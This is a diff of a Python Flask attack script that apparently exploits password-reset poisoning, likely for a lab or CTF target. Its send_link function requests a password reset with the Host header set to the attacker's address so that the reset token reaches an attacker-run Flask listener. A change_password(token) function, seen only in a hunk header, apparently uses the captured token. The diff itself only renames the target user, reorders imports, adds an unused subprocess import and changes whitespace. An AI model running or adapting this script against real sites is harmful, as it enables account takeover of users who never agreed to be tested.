@@ -5,17 +5,20 @@
 
 from flask import *
 import os,sys,re
-import requests
 import urllib
 import threading
 from base64 import b64encode
 import time
+import requests
+import subprocess as sub
 
 ###############
 ###############
+
 
 target  =  ""
 myaddy  =  ""
+
 
 ###############
 ###############
@@ -40,7 +43,7 @@ def change_password(token):
         return "failure"
 
 def send_link():
-    url = f"http://{target}/forgot?username=robert-dev-36712"
+    url = f"http://{target}/forgot?username=thing-dev-6666"
     headers = {"Host": f"{myaddy}"}
     res = requests.get(url, headers=headers)
     if "Password reset link has been sent to user inbox. Please use the link to reset your password" in res.text:
@@ -80,12 +83,14 @@ def test():
 ###############
 ###############
 
+
 if __name__ == "__main__":
     x = threading.Thread(target=FlaskThread)
     x.start()
     send_link()    
+
     
-####
-####
+###############
+###############
     
     
